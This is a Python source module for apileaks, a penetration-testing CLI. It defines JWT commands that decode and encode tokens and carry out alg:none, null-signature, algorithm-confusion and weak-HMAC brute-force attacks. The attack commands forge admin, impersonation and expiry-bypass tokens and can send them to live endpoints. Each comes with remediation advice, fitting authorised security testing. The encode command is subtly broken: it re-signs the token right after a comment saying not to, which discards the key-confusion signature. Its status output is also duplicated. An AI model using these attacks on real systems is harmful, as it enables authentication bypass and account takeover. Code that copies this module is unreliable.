"""
JWT command family — manual JWT attack and utility toolkit.

Extracted verbatim from ``apileaks.py`` (monolith decomposition, Phase 1). Defines
the ``jwt`` Click group and its subcommands plus the JWT engine helpers. The group
is registered onto the root ``cli`` by ``apileaks.py`` via ``cli.add_command(jwt)``.
This module does not import ``apileaks`` (no circular dependency).
"""

from __future__ import annotations

import asyncio
import copy
import json
import sys
from pathlib import Path

import click

from cli.output import _display_generated_tokens, _report_attack_result
from cli.parsers import _parse_custom_headers
from core.logging import get_logger
from utils.jwt_attack_engine import JWTAttackEngine
from utils.jwt_attack_models import AttackType
from utils.jwt_utils import (
    JWT_HEADER_COLOR,
    JWT_PAYLOAD_COLOR,
    JWT_SIGNATURE_COLOR,
    colorize_jwt,
    decode_jwt,
    encode_jwt,
    generate_ec_keypair,
    generate_rsa_keypair,
    parse_raw_request,
    print_jwt_info,
    read_vector_file,
    reconstruct_public_key_from_jwks,
    verify_hmac_secret,
    verify_token,
)

logger = get_logger(__name__)


def _build_jwt_http_engine(timeout=30, verify_ssl=True):
    """Build a shared :class:`HTTPRequestEngine` for JWT attack requests.

    Routing JWT HTTP through the shared engine applies the same rate limiting,
    proxy, User-Agent rotation, and TLS controls as the rest of the tool
    (Requirement 17.1).
    """
    from core.config import RateLimitConfig
    from utils.http_client import HTTPRequestEngine, RateLimiter, RetryConfig

    rate_limiter = RateLimiter(RateLimitConfig())
    retry_config = RetryConfig(max_attempts=3)
    return HTTPRequestEngine(rate_limiter, retry_config, timeout=timeout, verify_ssl=verify_ssl)


def _make_jwt_engine(
    token,
    url,
    custom_headers,
    data,
    http_engine=None,
    signing_secret=None,
    method=None,
    fuzz_target=None,
    fuzz_values=None,
    canary_value=None,
    public_key_material=None,
):
    """Construct a :class:`JWTAttackEngine` for a CLI subcommand.

    ``fuzz_target``/``fuzz_values`` drive the CLAIM_FUZZING vector (Req 63.1) and
    ``canary_value`` corroborates — but never replaces — analyzer-based success
    (Reqs 67.3-67.5). ``public_key_material`` supplies the target's asymmetric
    public key (PEM/DER path or inline PEM) used by the ALGORITHM_CONFUSION
    vector. All default to ``None`` so the single-token path is preserved
    unchanged when no new option is supplied (Req 67.5).
    """
    return JWTAttackEngine(
        target_url=url or "",
        original_token=token,
        http_engine=http_engine,
        signing_secret=signing_secret,
        public_key_material=public_key_material,
        custom_headers=custom_headers or {},
        post_data=data,
        method=method,
        fuzz_target=fuzz_target,
        fuzz_values=fuzz_values,
        canary_value=canary_value,
    )


def _run_jwt_vector(
    token,
    attack_type,
    url,
    custom_headers,
    data,
    timeout,
    verify_ssl=True,
    signing_secret=None,
    public_key_material=None,
    method=None,
):
    """Drive one JWT attack vector through the engine.

    When ``url`` is provided the vector is executed against the endpoint through
    the shared :class:`HTTPRequestEngine` and evaluated by the engine's response
    analyzer; otherwise the generated tokens are displayed for manual testing.
    """
    if not url:
        engine = _make_jwt_engine(
            token, url, custom_headers, data, public_key_material=public_key_material
        )
        _display_generated_tokens(engine, attack_type)
        click.echo("\n⚠️  Manual Testing Required (no --url provided):")
        click.echo("• Test each generated token against your API endpoints")
        click.echo("• If a token is accepted, the server is vulnerable to this attack")
        return

    async def _run():
        http_engine = _build_jwt_http_engine(timeout, verify_ssl)
        try:
            engine = _make_jwt_engine(
                token,
                url,
                custom_headers,
                data,
                http_engine=http_engine,
                signing_secret=signing_secret,
                method=method,
                public_key_material=public_key_material,
            )
            _display_generated_tokens(engine, attack_type)
            click.echo(f"\n🎯 Testing against endpoint: {url}")
            result = await engine.execute_attack(attack_type)
            _report_attack_result(result)
        finally:
            await http_engine.close()

    asyncio.run(_run())


@click.group()
@click.pass_context
def jwt(ctx):
    """Manual JWT attack and utility toolkit - decode, encode, and security testing

    \b
    This is the manual JWT toolkit: an operator-driven set of utilities and
    attack primitives you run by hand. It is distinct from the automated
    JWT_Module_Tests performed during an orchestrated OWASP run (see the
    'owasp auth' subcommand).

    \b
    JWT Security Testing includes:
    • Token decoding and analysis
    • Custom token generation
    • Algorithm confusion attacks (alg:none, null signature)
    • Weak HMAC secret brute-force
    • Key ID (kid) injection attacks
    • JWKS spoofing and inline injection
    • Comprehensive attack testing against live endpoints
    • Blank password signature acceptance
    • Login to an auth endpoint and capture the returned JWT

    \b
    Basic Examples:
      python apileaks.py jwt decode TOKEN
      python apileaks.py jwt encode '{"sub":"user"}' --secret key
      python apileaks.py jwt test-alg-none TOKEN
      python apileaks.py jwt brute-secret TOKEN --wordlist secrets.txt

    \b
    Fetch a token from a login endpoint:
      python apileaks.py jwt login --url http://HOST/api/v1/login \\
          --body '{"username":"user","password":"pass"}'
      python apileaks.py jwt login --url http://HOST/api/v1/login \\
          --body '{"username":"user","password":"pass"}' --save token.jwt

    \b
    Use 'python apileaks.py jwt COMMAND --help' for detailed help on any command.
    """
    pass


@jwt.command("decode")
@click.argument("token")
@click.pass_context
def jwt_decode_cmd(ctx, token):
    """Decode and analyze a JWT token

    \b
    Example:
      python apileaks.py jwt decode eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9...
    """
    try:
        decoded = decode_jwt(token)
        print_jwt_info(decoded)

        # Also output as JSON for programmatic use
        click.echo("\n📄 JSON Output:")
        click.echo("-" * 20)
        click.echo(
            json.dumps(
                {
                    "header": decoded["header"],
                    "payload": decoded["payload"],
                    "signature": decoded["signature"],
                },
                indent=2,
            )
        )

    except ValueError as e:
        click.echo(f"❌ Error decoding JWT: {e}", err=True)
        sys.exit(1)
    except Exception as e:
        click.echo(f"❌ Unexpected error: {e}", err=True)
        sys.exit(1)


@jwt.command("encode")
@click.argument("payload")
@click.option("--header", default='{"alg":"HS256","typ":"JWT"}', help="JWT header as JSON string")
@click.option("--secret", default="secret", help='Secret key for signing (default: "secret")')
@click.option(
    "--public-key",
    "public_key_file",
    type=click.Path(),
    help="PEM public key file to use as HMAC secret (RS256→HS256 key confusion attack). "
    "When provided, --secret is ignored and the raw DER bytes of the key are used.",
)
@click.pass_context
def jwt_encode_cmd(ctx, payload, header, secret, public_key_file):
    """Encode a JWT token with custom payload and header

    \b
    Examples:
      python apileaks.py jwt encode '{"sub":"user123","role":"user"}'
      python apileaks.py jwt encode '{"sub":"admin"}' --secret mysecret
      python apileaks.py jwt encode '{"sub":"admin","admin":1}' \\
          --header '{"alg":"HS256","typ":"JWT"}' \\
          --public-key public.pem
    """
    try:
        # Parse JSON strings
        try:
            header_dict = json.loads(header)
        except json.JSONDecodeError:
            click.echo("❌ Error: Header must be valid JSON", err=True)
            sys.exit(1)

        try:
            payload_dict = json.loads(payload)
        except json.JSONDecodeError:
            click.echo("❌ Error: Payload must be valid JSON", err=True)
            sys.exit(1)

        is_none_alg = header_dict.get("alg", "").lower() == "none"

        # --public-key: key confusion attack — sign with raw DER bytes of the
        # public key as the HMAC secret, exactly as vulnerable libraries do.
        if public_key_file:
            from cryptography.hazmat.backends import default_backend
            from cryptography.hazmat.primitives.serialization import (
                Encoding,
                PublicFormat,
                load_pem_public_key,
            )

            try:
                pem_data = Path(public_key_file).read_bytes()
                pub_key = load_pem_public_key(pem_data, backend=default_backend())
                # DER-encode the public key (SubjectPublicKeyInfo / PKCS#8 format)
                der_bytes = pub_key.public_bytes(Encoding.DER, PublicFormat.SubjectPublicKeyInfo)
            except Exception as exc:
                click.echo(f"❌ Could not load public key from {public_key_file}: {exc}", err=True)
                sys.exit(1)

            # Build token manually using raw DER bytes as HMAC key
            import base64 as _b64
            import hashlib as _hashlib
            import hmac as _hmac

            def _b64url(data: bytes) -> str:
                return _b64.urlsafe_b64encode(data).rstrip(b"=").decode()

            h_enc = _b64url(json.dumps(header_dict, separators=(",", ":")).encode())
            p_enc = _b64url(json.dumps(payload_dict, separators=(",", ":")).encode())
            msg = f"{h_enc}.{p_enc}".encode()
            sig = _hmac.new(der_bytes, msg, _hashlib.sha256).digest()
            token = f"{h_enc}.{p_enc}.{_b64url(sig)}"
            secret_label = f"<DER bytes of {public_key_file}>"
        else:
            token = encode_jwt(header_dict, payload_dict, secret)
            secret_label = secret

        # NOTE: token is already built above (either via DER-key path or encode_jwt).
        # Do NOT call encode_jwt again here — that would overwrite the DER-signed
        # key-confusion token with a plain HMAC-secret token (BUG-002 fix).

        # Encode JWT
        token = encode_jwt(header_dict, payload_dict, secret)

        click.echo("\n" + "=" * 60)
        click.echo("JWT Token Generated")
        click.echo("=" * 60)

        # Determine alg once; is_none_alg was already set before the if/else above.
        if is_none_alg:
            click.echo(
                click.style(
                    "\n⚠️  alg:none — no signature generated (trailing dot only)", fg="yellow"
                )
            )
        elif public_key_file:
            click.echo(
                click.style(
                    f"\n🔑 Key confusion: signed with DER bytes of {public_key_file}", fg="yellow"
                )
            )
        else:
            click.echo(f"\n🔑 Secret Used: {secret_label}")
        is_none_alg = header_dict.get("alg", "").lower() == "none"
        if is_none_alg:
            click.echo(
                click.style(
                    "\n⚠️  alg:none — no signature generated (trailing dot only)", fg="yellow"
                )
            )
        elif public_key_file:
            click.echo(
                click.style(
                    f"\n🔑 Key confusion: signed with DER bytes of {public_key_file}", fg="yellow"
                )
            )
        else:
            click.echo(f"\n🔑 Secret Used: {secret_label}")

        click.echo("📋 Header: " + click.style(json.dumps(header_dict), fg=JWT_HEADER_COLOR))
        click.echo("🔐 Payload: " + click.style(json.dumps(payload_dict), fg=JWT_PAYLOAD_COLOR))
        click.echo("\n🎫 Generated Token:")
        click.echo("-" * 20)
        if is_none_alg:
            # colorize_jwt would fail on an empty/absent signature — print raw token.
            click.echo(token)
            click.echo(
                "  "
                + click.style("■ header", fg=JWT_HEADER_COLOR, bold=True)
                + "  "
                + click.style("■ payload", fg=JWT_PAYLOAD_COLOR, bold=True)
                + "  "
                + click.style("■ (no signature)", fg=JWT_SIGNATURE_COLOR, bold=True)
            )
        else:
            click.echo(colorize_jwt(decode_jwt(token)))
            click.echo(
                "  "
                + click.style("■ header", fg=JWT_HEADER_COLOR, bold=True)
                + "  "
                + click.style("■ payload", fg=JWT_PAYLOAD_COLOR, bold=True)
                + "  "
                + click.style("■ signature", fg=JWT_SIGNATURE_COLOR, bold=True)
            )
        click.echo("\n" + "=" * 60)

    except ValueError as e:
        click.echo(f"❌ Error encoding JWT: {e}", err=True)
        sys.exit(1)
    except Exception as e:
        click.echo(f"❌ Unexpected error: {e}", err=True)
        sys.exit(1)


@jwt.command("verify")
@click.argument("token")
@click.option("--secret", help="Shared secret for HMAC (HS*) verification")
@click.option(
    "--key-file", type=click.Path(), help="Path to a PEM/DER public key or certificate file"
)
@click.option("--pem", help="Inline PEM public key or certificate material")
@click.option(
    "--jwks",
    "jwks_file",
    type=click.Path(),
    help='Path to a JWKS file (single JWK entry or {"keys": [...]})',
)
@click.pass_context
def jwt_verify_cmd(ctx, token, secret, key_file, pem, jwks_file):
    """Verify a JWT signature against supplied key material (network-free)

    Dispatches on the token header algorithm: HS* uses the shared --secret,
    while RS*/PS*/ES* use the public key from --key-file, --pem, or --jwks.
    No HTTP request is issued (Requirement 65.3).

    \b
    Examples:
      python apileaks.py jwt verify TOKEN --secret mysecret
      python apileaks.py jwt verify TOKEN --key-file public.pem
      python apileaks.py jwt verify TOKEN --pem "$(cat public.pem)"
      python apileaks.py jwt verify TOKEN --jwks jwks.json
    """
    try:
        # A JWKS source is read locally (no network, Req 65.3) and converted
        # via reconstruct_public_key_from_jwks inside verify_token. A read/parse
        # failure names the offending key source (Req 65.4).
        jwks_dict = None
        if jwks_file is not None:
            try:
                with open(jwks_file) as fh:
                    jwks_dict = json.loads(fh.read())
            except FileNotFoundError:
                raise ValueError(
                    f"Could not read JWKS file '{jwks_file}': file not found"
                ) from None
            except json.JSONDecodeError as exc:
                raise ValueError(f"Could not parse JWKS file '{jwks_file}': {exc}") from exc
            except OSError as exc:
                raise ValueError(f"Could not read JWKS file '{jwks_file}': {exc}") from exc

        result = verify_token(
            token,
            secret=secret,
            key_file=key_file,
            pem=pem,
            jwks=jwks_dict,
        )

        status = "✅ VALID" if result.valid else "❌ INVALID"
        click.echo("\n" + "=" * 60)
        click.echo("JWT Signature Verification")
        click.echo("=" * 60)
        click.echo(f"\n🔎 Algorithm: {result.algorithm}")
        click.echo(f"🔑 Key Source: {result.key_source}")
        click.echo(f"📋 Signature: {status}")
        click.echo("\n" + "=" * 60)

        # A failed verification is a reported result, not an error condition.
        sys.exit(0 if result.valid else 1)

    except ValueError as e:
        click.echo(f"❌ Error verifying JWT: {e}", err=True)
        sys.exit(1)
    except Exception as e:
        click.echo(f"❌ Unexpected error: {e}", err=True)
        sys.exit(1)


@jwt.command("genkey")
@click.option(
    "--type",
    "key_type",
    type=click.Choice(["rsa", "ec"]),
    default="rsa",
    show_default=True,
    help="Keypair type to generate",
)
@click.option(
    "--bits",
    type=int,
    default=2048,
    show_default=True,
    help="RSA modulus size in bits (used when --type rsa)",
)
@click.option(
    "--curve",
    type=click.Choice(["ES256", "ES384", "ES512"]),
    default="ES256",
    show_default=True,
    help="EC curve/algorithm (used when --type ec)",
)
@click.pass_context
def jwt_genkey_cmd(ctx, key_type, bits, curve):
    """Generate a test RSA or EC keypair and emit the PEM material (local-only)

    No HTTP request is issued (Requirement 66.4). Emits both the generated
    private and public key material (Requirement 66.1).

    \b
    Examples:
      python apileaks.py jwt genkey --type rsa
      python apileaks.py jwt genkey --type rsa --bits 4096
      python apileaks.py jwt genkey --type ec --curve ES256
    """
    try:
        if key_type == "rsa":
            private_pem, public_pem = generate_rsa_keypair(bits=bits)
            label = f"RSA {bits}-bit"
        else:
            private_pem, public_pem = generate_ec_keypair(curve=curve)
            label = f"EC {curve}"

        click.echo("\n" + "=" * 60)
        click.echo(f"Generated {label} keypair")
        click.echo("=" * 60)
        click.echo("\n🔑 Private Key (PEM):\n")
        click.echo(private_pem.strip())
        click.echo("\n📢 Public Key (PEM):\n")
        click.echo(public_pem.strip())
        click.echo("\n" + "=" * 60)
        sys.exit(0)

    except ValueError as e:
        click.echo(f"❌ Error generating keypair: {e}", err=True)
        sys.exit(1)
    except Exception as e:
        click.echo(f"❌ Unexpected error: {e}", err=True)
        sys.exit(1)


@jwt.command("jwks-to-key")
@click.option(
    "--jwks",
    "jwks_file",
    type=click.Path(),
    required=True,
    help='Path to a JWKS file (single JWK entry or {"keys": [...]})',
)
@click.pass_context
def jwt_jwks_to_key_cmd(ctx, jwks_file):
    """Reconstruct a public key PEM from a local JWKS entry (network-free)

    Converts RSA n/e or EC crv/x/y parameters into a usable public key
    (Requirement 66.2) reusing the same JWK-to-key conversion as the attack
    engine (Requirement 66.3). No HTTP request is issued (Requirement 66.4).
    Unparseable or parameter-missing input is rejected with a descriptive
    error (Requirement 66.5).

    \b
    Examples:
      python apileaks.py jwt jwks-to-key --jwks jwks.json
    """
    try:
        # The JWKS file is read locally (no network, Req 66.4). A read/parse
        # failure names the offending source (Req 66.5).
        try:
            with open(jwks_file) as fh:
                jwks_data = json.loads(fh.read())
        except FileNotFoundError:
            raise ValueError(f"Could not read JWKS file '{jwks_file}': file not found") from None
        except json.JSONDecodeError as exc:
            raise ValueError(f"Could not parse JWKS file '{jwks_file}': {exc}") from exc
        except OSError as exc:
            raise ValueError(f"Could not read JWKS file '{jwks_file}': {exc}") from exc

        # Accept either a full JWKS ({"keys": [...]}) or a single JWK entry.
        if isinstance(jwks_data, dict) and "keys" in jwks_data:
            keys = jwks_data.get("keys")
            if not isinstance(keys, list) or not keys:
                raise ValueError(f"JWKS file '{jwks_file}' contains no key entries to reconstruct")
            jwk = keys[0]
        else:
            jwk = jwks_data

        public_pem = reconstruct_public_key_from_jwks(jwk)

        click.echo("\n" + "=" * 60)
        click.echo("Reconstructed Public Key from JWKS")
        click.echo("=" * 60)
        click.echo("\n📢 Public Key (PEM):\n")
        click.echo(public_pem.strip())
        click.echo("\n" + "=" * 60)
        sys.exit(0)

    except ValueError as e:
        click.echo(f"❌ Error reconstructing public key: {e}", err=True)
        sys.exit(1)
    except Exception as e:
        click.echo(f"❌ Unexpected error: {e}", err=True)
        sys.exit(1)


@jwt.command("test-alg-none")
@click.argument("token")
@click.option("--payload", help="Custom payload to inject (JSON format)")
@click.option("--url", "-u", help="Target URL to test alg:none attack against (optional)")
@click.option(
    "--method",
    "-X",
    "method",
    type=click.Choice(["GET", "POST", "PUT", "PATCH", "DELETE"], case_sensitive=False),
    help="HTTP method to use (default: POST if --data is set, otherwise GET)",
)
@click.option(
    "--header",
    "-H",
    multiple=True,
    help='Custom headers for endpoint testing (format: "Name: Value")',
)
@click.option("--data", "-d", help="POST data for endpoint testing")
@click.option("--timeout", default=30, help="Request timeout in seconds (default: 30)")
@click.pass_context
def jwt_test_alg_none(ctx, token, payload, url, method, header, data, timeout):
    """Test algorithm confusion attack with alg:none

    \b
    🧪 CRITICAL SEVERITY ATTACK
    Algorithm confusion - completely nullifies authentication by:

    1️⃣ Rewriting header: "alg": "none"\b
    2️⃣ Removing signature completely\b
    3️⃣ Inserting malicious payload\b
    4️⃣ Sending unsigned token\b
    5️⃣ Testing privileged access


    \b
    Examples:
      # Basic alg:none test
      python apileaks.py jwt test-alg-none TOKEN

      # Test with custom admin payload
      python apileaks.py jwt test-alg-none TOKEN --payload '{"sub":"admin","role":"admin"}'

      # Test against real endpoint
      python apileaks.py jwt test-alg-none TOKEN --url https://api.example.com/admin
    """
    try:
        click.echo("🔍 Algorithm Confusion Attack (alg:none)")
        click.echo("=" * 45)
        click.echo("🔥 SEVERITY: CRITICAL - Authentication Completely Nullified")
        click.echo("")

        custom_headers = _parse_custom_headers(header)

        # Decode original token for display
        decoded = decode_jwt(token)
        click.echo(f"📋 Original Header: {json.dumps(decoded['header'])}")
        click.echo(f"📋 Original Payload: {json.dumps(decoded['payload'])}")
        click.echo("")

        # Route generation + execution through the single-source-of-truth engine
        # (Requirements 14.2, 14.3, 17.1, 19.2). If a custom payload is supplied
        # it is merged onto the base token before running the vector.
        base_token = token
        if payload:
            try:
                custom_payload = json.loads(payload)
            except json.JSONDecodeError:
                click.echo(f"❌ Invalid JSON payload: {payload}")
                return
            merged = copy.deepcopy(decoded["payload"])
            merged.update(custom_payload)
            base_token = encode_jwt(decoded["header"], merged, "secret")

        _run_jwt_vector(
            base_token, AttackType.ALG_NONE, url, custom_headers, data, timeout, method=method
        )

        click.echo("\n💡 REMEDIATION:")
        click.echo("• Configure JWT library to REJECT alg:none tokens")
        click.echo("• Implement algorithm whitelist (e.g., only allow HS256, RS256)")
        click.echo("• Never trust the algorithm specified in JWT header")
        click.echo("• Use proper JWT validation libraries, not custom implementations")

    except Exception as e:
        click.echo(f"❌ Error: {e}", err=True)
        sys.exit(1)


@jwt.command("test-null-signature")
@click.argument("token")
@click.option("--payload", help="Custom payload to inject (JSON format)")
@click.option("--url", "-u", help="Target URL to test null signature attack against (optional)")
@click.option(
    "--header",
    "-H",
    multiple=True,
    help='Custom headers for endpoint testing (format: "Name: Value")',
)
@click.option("--data", "-d", help="POST data for endpoint testing")
@click.option("--timeout", default=30, help="Request timeout in seconds (default: 30)")
@click.pass_context
def jwt_test_null_signature(ctx, token, payload, url, header, data, timeout):
    """Test null signature vulnerability

    \b
    🧾 CRITICAL SEVERITY ATTACK
    Null/empty signature acceptance - cryptographic validation bypass by:

    1️⃣ Sending JWT with empty signature: header.payload.\b
    2️⃣ Inserting admin payload\b
    3️⃣ Testing against protected endpoint\b
    4️⃣ Confirming bypass of signature validation

    \b
    Examples:
      # Basic null signature test
      python apileaks.py jwt test-null-signature TOKEN

      # Test with custom admin payload
      python apileaks.py jwt test-null-signature TOKEN --payload '{"sub":"admin","admin":true}'

      # Test against real endpoint
      python apileaks.py jwt test-null-signature TOKEN --url https://api.example.com/protected
    """
    try:
        click.echo("🔍 Null Signature Vulnerability Test")
        click.echo("=" * 40)
        click.echo("🔥 SEVERITY: CRITICAL - Cryptographic Validation Bypass")
        click.echo("")

        custom_headers = _parse_custom_headers(header)

        # Decode original token for display
        decoded = decode_jwt(token)
        click.echo(f"📋 Original Header: {json.dumps(decoded['header'])}")
        click.echo(f"📋 Original Payload: {json.dumps(decoded['payload'])}")
        click.echo("")

        # Route generation + execution through the single-source-of-truth engine
        # (Requirements 14.2, 14.3, 17.1, 19.2). A custom payload is merged onto
        # the base token before running the vector.
        base_token = token
        if payload:
            try:
                custom_payload = json.loads(payload)
            except json.JSONDecodeError:
                click.echo(f"❌ Invalid JSON payload: {payload}")
                return
            merged = copy.deepcopy(decoded["payload"])
            merged.update(custom_payload)
            base_token = encode_jwt(decoded["header"], merged, "secret")

        _run_jwt_vector(base_token, AttackType.NULL_SIGNATURE, url, custom_headers, data, timeout)

        click.echo("\n💡 REMEDIATION:")
        click.echo("• Implement proper signature validation - never accept empty signatures")
        click.echo("• Validate signature length and format before verification")
        click.echo("• Use established JWT libraries with proper validation")
        click.echo("• Implement signature presence checks before cryptographic verification")

    except Exception as e:
        click.echo(f"❌ Error: {e}", err=True)
        sys.exit(1)


def _load_public_key_material_cli(material):
    """Resolve operator-supplied public-key material for the CLI.

    ``material`` may be a filesystem path to a PEM/DER file or inline PEM
    text. Returns raw bytes when a readable file is found (so binary DER works),
    otherwise the original string (inline PEM). Mirrors the auth module's
    path-or-inline resolution so both entry points behave identically.
    """
    try:
        path = Path(material)
        if path.exists() and path.is_file():
            return path.read_bytes()
    except (OSError, ValueError):
        pass
    return material


@jwt.command("test-alg-confusion")
@click.argument("token")
@click.option(
    "--public-key",
    "public_key",
    required=True,
    metavar="PATH_OR_PEM",
    help="Target RSA/EC public key (PEM/DER file path or inline PEM) used as the HMAC secret",
)
@click.option("--payload", help="Custom payload to inject (JSON format)")
@click.option("--url", "-u", help="Target URL to test the confusion attack against (optional)")
@click.option(
    "--header",
    "-H",
    multiple=True,
    help='Custom headers for endpoint testing (format: "Name: Value")',
)
@click.option("--data", "-d", help="POST data for endpoint testing")
@click.option("--timeout", default=30, help="Request timeout in seconds (default: 30)")
@click.pass_context
def jwt_test_alg_confusion(ctx, token, public_key, payload, url, header, data, timeout):
    """Test algorithm/key confusion attack (RS256/ES256 -> HS256 substitution)

    \b
    🧪 CRITICAL SEVERITY ATTACK
    Algorithm confusion (aka Substitution Attack) forges a token that a server
    validates with the SAME public key it uses for RS*/ES* verification, but
    treated as an HS256 HMAC secret:

    1️⃣ Switch the header alg from RS256/ES256 to HS256\b
    2️⃣ HMAC-sign header.payload using the server's PUBLIC KEY bytes as the secret\b
    3️⃣ Every public-key representation is tried (PEM ±newline, DER, x5c cert)\b
    4️⃣ A server that accepts the forged token confuses the key's role

    \b
    Examples:
      # Generate confusion tokens for manual testing
      python apileaks.py jwt test-alg-confusion TOKEN --public-key server_pub.pem

      # Inject an admin payload and test against a live endpoint
      python apileaks.py jwt test-alg-confusion TOKEN --public-key key.pem \\
          --payload '{"role":"admin"}' --url https://api.example.com/admin
    """
    try:
        click.echo("🔍 Algorithm/Key Confusion Attack (RS256/ES256 -> HS256)")
        click.echo("=" * 55)
        click.echo("🔥 SEVERITY: CRITICAL - Signature forged with the public key")
        click.echo("")

        custom_headers = _parse_custom_headers(header)
        public_key_material = _load_public_key_material_cli(public_key)

        # Decode original token for display.
        decoded = decode_jwt(token)
        click.echo(f"📋 Original Header: {json.dumps(decoded['header'])}")
        click.echo(f"📋 Original Payload: {json.dumps(decoded['payload'])}")
        click.echo("")

        # Merge a custom payload onto the base token before running the vector.
        base_token = token
        if payload:
            try:
                custom_payload = json.loads(payload)
            except json.JSONDecodeError:
                click.echo(f"❌ Invalid JSON payload: {payload}")
                return
            merged = copy.deepcopy(decoded["payload"])
            merged.update(custom_payload)
            base_token = encode_jwt(decoded["header"], merged, "secret")

        _run_jwt_vector(
            base_token,
            AttackType.ALGORITHM_CONFUSION,
            url,
            custom_headers,
            data,
            timeout,
            public_key_material=public_key_material,
        )

        click.echo("\n💡 REMEDIATION:")
        click.echo("• Bind each key to a single algorithm; never share keys across alg families")
        click.echo("• Enforce an algorithm allowlist (e.g. only RS256) during verification")
        click.echo("• Never let the token header dictate the verification algorithm")

    except Exception as e:
        click.echo(f"❌ Error: {e}", err=True)
        sys.exit(1)


@jwt.command("brute-secret")
@click.argument("token")
@click.option(
    "--wordlist",
    "-w",
    default="wordlists/jwt_secrets.txt",
    help="Wordlist file for secret brute-force",
)
@click.option("--max-attempts", default=1000, help="Maximum brute-force attempts")
@click.option("--url", "-u", help="Target URL to test recovered secret against (optional)")
@click.option(
    "--header",
    "-H",
    multiple=True,
    help='Custom headers for endpoint testing (format: "Name: Value")',
)
@click.option("--data", "-d", help="POST data for endpoint testing")
@click.option("--timeout", default=30, help="Request timeout in seconds (default: 30)")
@click.pass_context
def jwt_brute_secret(ctx, token, wordlist, max_attempts, url, header, data, timeout):
    """Brute-force weak HMAC secrets and test exploitation

    \b
    🔐 CRITICAL SEVERITY ATTACK
    This attack attempts to crack JWT HMAC secrets and demonstrates
    complete authentication compromise by:

    1️⃣ Confirming JWT uses HS* algorithm\b
    2️⃣ Executing brute-force/dictionary attack\b
    3️⃣ Recovering the real secret\b
    4️⃣ Forging new JWT with modified claims\b
    5️⃣ Testing real API access with forged token\b


    \b
    Examples:
      # Basic secret brute-force
      python apileaks.py jwt brute-secret TOKEN

      # Test exploitation against real endpoint
      python apileaks.py jwt brute-secret TOKEN --url https://api.example.com/admin

      # Full exploitation test with custom headers
      python apileaks.py jwt brute-secret TOKEN -u URL -H "X-API-Key: key123"
    """
    try:
        click.echo("🔍 JWT HMAC Secret Brute-Force Attack")
        click.echo("=" * 45)
        click.echo("🔥 SEVERITY: CRITICAL - Complete Authentication Compromise")
        click.echo("")

        # Parse custom headers
        custom_headers = {}
        for h in header:
            if ":" not in h:
                click.echo(f"❌ Invalid header format: {h}. Use 'Name: Value' format.", err=True)
                sys.exit(1)
            name, value = h.split(":", 1)
            custom_headers[name.strip()] = value.strip()

        # Check if wordlist exists
        if not Path(wordlist).exists():
            click.echo(f"❌ Wordlist not found: {wordlist}")
            click.echo("Creating default wordlist...")

            # Create default wordlist
            Path(wordlist).parent.mkdir(exist_ok=True)
            default_secrets = [
                "secret",
                "password",
                "123456",
                "admin",
                "jwt_secret",
                "your_secret_key",
                "mysecret",
                "key",
                "token",
                "auth",
                "api_key",
                "private_key",
                "hmac_secret",
                "signing_key",
                "jwt_key",
                "access_token",
                "refresh_token",
                "session_key",
                "",
                "null",
                "undefined",
                "test",
                "dev",
                "development",
                "prod",
                "production",
                "staging",
                "demo",
                "example",
            ]

            with open(wordlist, "w") as f:
                for secret in default_secrets:
                    f.write(f"{secret}\n")

            click.echo(f"✅ Created default wordlist: {wordlist}")

        # Load secrets from wordlist
        with open(wordlist) as f:
            secrets = [line.strip() for line in f if line.strip() and not line.startswith("#")]

        # Decode token to get header and payload
        decoded = decode_jwt(token)

        # 1️⃣ Confirm JWT uses HS* algorithm
        algorithm = decoded["header"].get("alg", "").upper()
        if not algorithm.startswith("HS"):
            click.echo(f"⚠️  WARNING: Token uses {algorithm} algorithm, not HMAC")
            click.echo("   This attack only works against HS256, HS384, HS512")
            if not click.confirm("Continue anyway?"):
                return

        click.echo(f"✅ Target algorithm: {algorithm}")
        click.echo(f"📋 Testing {min(len(secrets), max_attempts)} secrets...")
        click.echo("")

        # 2️⃣ & 3️⃣ Recover the secret by SIGNATURE VERIFICATION (Req 16.1-16.3).
        # A candidate is recovered if and only if verify_hmac_secret is True:
        # the HMAC over the ORIGINAL raw header.payload segments equals the
        # original signature. We never re-encode the full token and string-
        # compare it to the original (Req 16.2), which previously missed valid
        # secrets due to re-serialization differences. ``None`` sentinel is used
        # so a legitimately recovered empty-string secret is not treated as
        # "not found".
        found_secret = None
        candidates = secrets[:max_attempts]
        for i, secret in enumerate(candidates):
            if i % 50 == 0 and i > 0:
                click.echo(
                    f"🔄 Progress: {i}/{len(candidates)} ({(i / len(candidates) * 100):.1f}%)"
                )
            try:
                if verify_hmac_secret(token, secret):
                    found_secret = secret
                    break
            except Exception:
                continue

        if found_secret is None:
            click.echo("\n❌ Secret not found in wordlist")
            click.echo("💡 Try a larger wordlist or the secret may be strong")
            return

        # 🎉 SECRET RECOVERED! Report the recovered secret AND the matching
        # algorithm (Req 16.4). The matching algorithm is the header ``alg`` that
        # verify_hmac_secret validated the signature against.
        click.echo("\n" + "=" * 60)
        click.echo("🎉 SUCCESS! HMAC SECRET RECOVERED!")
        click.echo("=" * 60)
        click.echo(f"🔑 Recovered Secret: '{found_secret}'")
        click.echo(f"🧮 Matching Algorithm: {algorithm}")
        click.echo("⚠️  This JWT uses a weak secret that can be brute-forced!")
        click.echo("")

        # 4️⃣ & 5️⃣ Forge and exploit through the single-source-of-truth engine.
        # Using the recovered secret as the signing key, the engine forges the
        # privilege-escalation / impersonation / expiration-bypass tokens and,
        # when a URL is supplied, issues them through the shared HTTPRequestEngine
        # (Req 17.1). Success is decided by the engine's response analyzer, never
        # by admin/dashboard keyword presence (Req 19.2).
        forge_vectors = (
            AttackType.WEAK_SECRET,
            AttackType.PRIVILEGE_ESCALATION,
            AttackType.USER_IMPERSONATION,
            AttackType.EXPIRATION_BYPASS,
        )

        if url:
            click.echo("4️⃣ Forging and testing exploitation tokens via JWTAttackEngine...")
            click.echo(f"🎯 Target: {url}")

            async def _run():
                http_engine = _build_jwt_http_engine(timeout)
                try:
                    engine = _make_jwt_engine(
                        token,
                        url,
                        custom_headers,
                        data,
                        http_engine=http_engine,
                        signing_secret=found_secret,
                    )
                    for attack_type in forge_vectors:
                        result = await engine.execute_attack(attack_type)
                        _report_attack_result(result)
                finally:
                    await http_engine.close()

            asyncio.run(_run())
        else:
            click.echo("4️⃣ Forging exploitation tokens via JWTAttackEngine...")
            engine = _make_jwt_engine(token, url, custom_headers, data, signing_secret=found_secret)
            for attack_type in forge_vectors:
                _display_generated_tokens(engine, attack_type)
